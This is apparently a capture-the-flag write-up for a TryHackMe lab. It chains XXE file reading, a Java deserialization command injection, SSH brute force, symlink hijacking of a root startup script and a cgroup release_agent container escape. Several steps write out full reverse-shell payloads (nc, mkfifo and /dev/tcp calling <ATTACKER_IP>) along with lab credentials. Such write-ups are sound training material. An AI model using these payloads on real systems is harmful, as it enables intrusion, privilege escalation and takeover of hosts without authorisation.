# [You're in a cave](https://tryhackme.com/room/inacave)

## A room with some ctf elements inspired in text based RPGs

# You find yourself in a cave

### What was the weird thing carved on the door?

_After getting it to work with POST, you can try it with GET_

1. Scan the target machine to identify open ports and running services:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
3333/tcp open  dec-notes
```

2. Enumerate web directories and files to find hidden endpoints:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

**Results:**

```
/search               (Status: 200) [Size: 197]
/attack               (Status: 200) [Size: 181]
/lamp                 (Status: 200) [Size: 261]
/matches              (Status: 200) [Size: 249]
/walk                 (Status: 200) [Size: 161]
/server-status        (Status: 403) [Size: 278]
```

3. Connect to the service using netcat to explore the RPG interface:

```bash
nc <TARGET_IP> 3333
```

Test various commands:

```
search

You can\'t see anything, the cave is very dark.
```

```
matches

You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.
```

```
walk

There's nowhere to go.
```

```
attack

You punch the wall, nothing happens.
```

```
lamp

You grab a lamp, and it gives enough light to search around
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh
```

The `matches` command reveals the working directory `/home/cave/src`, and the `lamp` command lists files in the directory, showing Java source and class files.

4. Based on the web endpoints discovered, test for XML External Entity (XXE) injection on the /`action.php` endpoint:

```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///home/cave/src/RPG.java">]><data>&file;</data>' http://<TARGET_IP>/action.php
```

**Result:**

```java
import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}
```

5. The code shows that:

- The server listens on port 3333
- User input is used to construct a URL to http://cave.thm/
- The response is expected to be a Base64-encoded serialized Java object
- The object is deserialized and executed
- The Action class executes shell commands via Runtime.getRuntime().exec()
- Command injection is possible by escaping the echo statement

6. Copy the Java source code locally and modify it to generate a malicious serialized object. Remove the `import org.apache.commons.io.IOUtils;` line, and replace the main function with:

```java
public static void main(String[]args){
    try {
        String str=Serialize.toString(new Action("abc","trying\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f;echo \""));
        System.out.println(str);
    } catch(Exception e) {
        System.out.println(e);
    }
}
```

This payload exploits command injection by escaping the echo statement and establishing a reverse shell connection.

7. Compile the modified Java code and execute it to generate the Base64-encoded payload:

```bash
javac RPG.java
java RPG
```

8. Open a listener on your attacker machine to catch the reverse shell:

```bash
nc -lvnp 4444
```

9. URL-encode the generated payload using [CyberChef](https://gchq.github.io/CyberChef/) with the "URL Encode" operation. Connect to the service and send the payload as a GET request parameter:

```bash
nc <TARGET_IP> 3333

action.php?<xml>rO0ABXNyAAZBY3Rpb275vE3ugB8ZOwIAA0wAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAARuYW1lcQB%2BAAFMAAZvdXRwdXRxAH4AAXhwdABfdHJ5aW5nIjtybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyA8QVRUQUNLRVJfSVA%2BIDQ0NDQgPi90bXAvZjtlY2hvICJ0AANhYmN0AAA%3D</xml>
```

10. Once the reverse shell connects, explore the filesystem:

```bash
ls /home
cd /home/cave
ls
cat info.txt
```

<img width="1405" height="389" alt="SCREEN01" src="https://github.com/user-attachments/assets/e2c21ac4-b3af-41ae-8a1a-e6a2fdfc2155" />

---

### What weapon you used to defeat the skeleton?

_Take a second look in the text files_

1. The `info.txt` file contains a hint about a password pattern. Use exrex to generate possible passwords based on the regex pattern:

```bash
git clone https://github.com/asciimoo/exrex.git
```

2. Based on the pattern found in the file, generate a wordlist:

```bash
python3 exrex/exrex.py -o passwords '^****************************$'
```

3. Use Hydra to brute force the SSH login for user door:

```bash
hydra -l door -P passwords ssh://<TARGET_IP> -s 2222
```

4. Connect via SSH using the discovered credentials:

```bash
ssh door@<TARGET_IP> -p 2222
# edfh#22xf!
```

5. List and examine the files present:

**info.txt**

```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
It looks like the skeleton doesn't want to let anyone pass through.
```

**oldman.gpg**

```
-----BEGIN PGP MESSAGE-----

hQGMA9WiE9KSoKJZAQv/VyBwSZVIzFE8Er4z4P6vkq33LCGruRqop2J5hFyPYkSg
xx9ezdOvqq6zKt9Y10PyIkiNWsie3SJ6LC4k2s8YysQT1Ni5XF8j/oH24yxweXaZ
VBcwY63Z3qiOB3TCWwFJ/5oMsI8G0c5VuZSLJqRbzdAqEmRVkg0iQ+9xYkk8/1jW
xKCS2AWh0gq3Bsivf/wm/05dU+jw4QZe8r6OWWVfjua0/IblJkPq/VoOenUYjso3
po3fy3noac1AysQww7p6ybz6VSFhln0amOQQ67EiR9t1tEs5yStrlNY8kPuMWrQ+
3Xw0v9APdOi0aE68PO2kDwhdj3uuu9d2ToFQxcvsRDp2rUVRj0HDfcUw99ln4a0V
z1K6eK3c5DM4o84EUqTHlAzraS7VgY+Bja9APqipqwAUDZQlxt3hzoOu8Vd1//M0
HTA4EHHeseSXeGFJublt0bsO2m0vEukzvTRjN9rs0Tfx8aV5iPs9Cbr+m7qIQRvg
ZIMnI7eWCO6pBcTBgzXt0noBn691sjTbmDu4mmP6dOmG+zjNe6gCzWpDfobc76HR
DNtrQxRPfzSBqxfcyGX1abkpVnsK5tqEcPNBnB1cxMP2mX/r69HBQqV84okjKkkW
lKS4cubAIVhTe493rEoiFIxUME78dVg8z9LNbaFEPQpaPgF1T4uiow/4YA==
=uZz2
-----END PGP MESSAGE-----
```

6. Check for additional web directories or virtual hosts:

```bash
ls /var/www
```

**Results:**

```
adventurer  html
```

7. Add the discovered virtual host to your local hosts file:

```bash
echo "<TARGET_IP> adventurer.cave.thm" >> /etc/hosts
```

8. Access the adventurer virtual host and download files:

```bash
wget http://adventurer.cave.thm/adventurer.priv
```

9. Use `cat -v` to reveal hidden control characters in the info.txt file:

```bash
cat -v info.txt
```

**Results:**

```
After using your brute force against the door you broke it!
You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
The private key password is breakingbonessince1982 ^[[A
It looks like the skeleton doesn't want to let anyone pass through.
```

The escape character ^[[A hides the password line when displayed normally. The password is revealed as `breakingbonessince1982`.

10. Import the private key and decrypt the oldman.gpg file:

```bash
gpg --import adventurer.priv
gpg --output message --no-tty oldman.gpg
cat message
```

**message**

```
IT'S DANGEROUS TO GO ALONE! TAKE THIS b**********************r
```

<img width="678" height="429" alt="SCREEN02" src="https://github.com/user-attachments/assets/32635426-9c41-4fac-8de9-0376944d1922" />

---

### What is the cave flag?

1. Set the weapon as an environment variable and execute the skeleton binary:

```bash
export INVENTORY=b**********************r
./skeleton
# skeleton:sp00kyscaryskeleton
```

2. Use the discovered credentials to switch users:

```bash
su skeleton
cd /home/skeleton
```

3. Examine the next clue:

```bash
cat info.txt
```

**info.txt**

```
After successfully defeating the skeleton with the b**********************r you went forward.
In front of you there's a big opening and after it there's a huge tree that seems magical, you can feel the freedom!
But although you can see it, you can't go to it because there's an invisible wall that keeps you from getting to the root of the tree.
```

4. Identify what commands the skeleton user can run with sudo:

```bash
sudo -l
```

**Results:**

```
User skeleton may run the following commands on localhost:
    (root) NOPASSWD: /bin/kill
```

The skeleton user can run `kill` as root without a password, but this alone doesn't give shell access.

5. Check for unusual files or symlinks:

```bash
cd /opt/link
ls -la
```

**Results:**

```
total 8
drwxrwxrwx 2 root     root     4096 Aug 28  2020 .
drwxr-xr-x 1 root     root     4096 Aug 27  2020 ..
lrwxrwxrwx 1 skeleton skeleton   16 Aug 27  2020 startcon -> ../root/start.sh
```

A writable symlink points to `/root/start.sh`, which is likely executed at container startup.

6. The symlink is owned by skeleton, allowing us to replace it with a malicious script. Copy the original script and add a reverse shell:

```bash
mv ./startcon /tmp
cd /tmp
cat startcon
```

Add the following reverse shell at the end of the script:

```bash
#!/bin/bash

service ssh start
service apache2 start
su - cave -c "cd /home/cave/src; ./run.sh"

bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
/bin/bash
```

7. Prepare to receive the root reverse shell:

```bash
nc -lvnp 4444
```

8. Identify the PID of the main startup process that runs as root:

```bash
ps -e
```

**Results:**

```
  PID TTY          TIME CMD
    1 pts/0    00:00:00 start.sh
   21 ?        00:00:00 sshd
   48 ?        00:00:00 apache2
   63 pts/0    00:00:00 su
   64 ?        00:00:00 bash
   66 ?        00:00:00 run.sh
   77 ?        00:00:06 java
  120 ?        00:00:01 apache2
  140 ?        00:00:01 apache2
  171 ?        00:00:00 apache2
  179 ?        00:00:00 apache2
  184 ?        00:00:00 apache2
  185 ?        00:00:00 apache2
  193 ?        00:00:00 apache2
  198 ?        00:00:00 apache2
  232 ?        00:00:00 apache2
  233 ?        00:00:00 apache2
  267 ?        00:00:00 sh
  271 ?        00:00:00 cat
  272 ?        00:00:00 sh
  273 ?        00:00:00 nc
  672 ?        00:00:00 sshd
  687 ?        00:00:00 sshd
  688 pts/1    00:00:00 bash
  706 ?        00:00:02 gpg-agent
  720 pts/1    00:00:00 su
  721 pts/1    00:00:00 bash
  739 pts/1    00:00:00 ps
```

9. Kill a process that's managed by the start script to trigger a restart:

```bash
sudo /bin/kill -9 77
```

10. Once the reverse shell connects with root privileges, navigate to the root directory:

```bash
cat /root/info.txt
```

**info.txt**

```
You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
You could feel the cave rumbling, like it was the end for you and then all went black.
But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.

You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.

Flag:THM{n*****************e}
```

---

### What is the outside flag?

1. Prepare to receive a shell from outside the container:

```bash
nc -lvnp 5555
```

2. Use a cgroup release_agent exploit to escape the container. This technique abuses cgroup notifications to execute arbitrary commands on the host:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

3. When the cgroup triggers, the reverse shell connects from the host machine, giving you access to the actual server running Docker:

```bash
cat /root/info.txt
```

```
You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.

Flag:THM{d**************************p}
```
